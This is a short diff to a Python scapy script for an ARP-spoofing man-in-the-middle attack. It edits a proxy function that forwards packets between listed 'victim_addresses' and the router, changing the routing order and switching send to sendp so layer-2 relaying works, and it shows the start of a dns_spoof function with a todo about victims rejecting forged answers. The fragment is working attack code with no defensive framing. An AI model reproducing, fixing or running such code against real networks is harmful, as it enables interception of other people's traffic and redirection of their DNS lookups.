@@ -24,16 +24,17 @@ def isDnsResponse(packet):
 def proxy(packet):
     if isDnsResponse(packet):
         return    
-    if packet[scapy.IP].src in victim_addresses.keys():
-        #needs to go to router
-        packet[scapy.Ether].dst = arp_spoofing.get_mac(router_ip)
-    elif packet[scapy.IP].dst in victim_addresses.keys():
+    
+    if packet[scapy.IP].dst in victim_addresses.keys():
         #needs to go to client
         packet[scapy.Ether].dst = arp_spoofing.get_mac(packet[scapy.IP].dst) 
+    elif packet[scapy.IP].src in victim_addresses.keys():
+        #needs to go to router
+        packet[scapy.Ether].dst = arp_spoofing.get_mac(router_ip)
     else :
         return
 
-    scapy.send(packet, verbose=0)
+    scapy.sendp(packet, verbose=0)
 
 #todo client doesnt seem to take this as answer even when cut off from internet
 def dns_spoof(packet):
